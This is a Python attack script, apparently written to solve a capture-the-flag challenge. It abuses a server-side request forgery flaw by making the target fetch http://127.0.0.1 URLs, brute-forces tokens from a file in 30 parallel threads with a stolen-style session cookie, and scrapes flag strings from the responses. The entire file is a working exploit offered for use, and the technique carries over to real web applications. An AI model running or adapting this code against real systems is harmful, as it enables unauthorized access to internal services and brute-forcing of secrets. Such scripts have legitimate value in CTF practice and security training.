import requests
import sys
import re
from concurrent.futures import ThreadPoolExecutor

def fetch_flag(target_url, token, cookie):
    ssrf_url = f"http://127.0.0.1/?token={token}"
    try:
        res = requests.get(target_url, params={"url": ssrf_url}, headers={"Cookie": cookie}, timeout=5)
        if "flag{" in res.text:
            match = re.search(r"flag\{[^}]+\}", res.text)
            if match:
                print(f"[+] ✅ Token: {token} => {match.group(0)}")
                return match.group(0)
    except Exception as e:
        pass
    return None

def main():
    if len(sys.argv) < 4:
        print("Usage: python ssrf_flag_hunter.py <TARGET_URL> <TOKEN_FILE> <PHPSESSID=...>")
        return

    target_url = sys.argv[1]
    token_file = sys.argv[2]
    cookie = sys.argv[3]

    with open(token_file) as f:
        tokens = [line.strip() for line in f if line.strip()]

    print(f"[*] 🚀 Launching parallel scan on {len(tokens)} tokens...")

    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = [executor.submit(fetch_flag, target_url, token, cookie) for token in tokens]
        for future in futures:
            future.result()  # Just to block and print as they complete

    print("[*] ✅ Scan complete.")

if __name__ == "__main__":
    main()
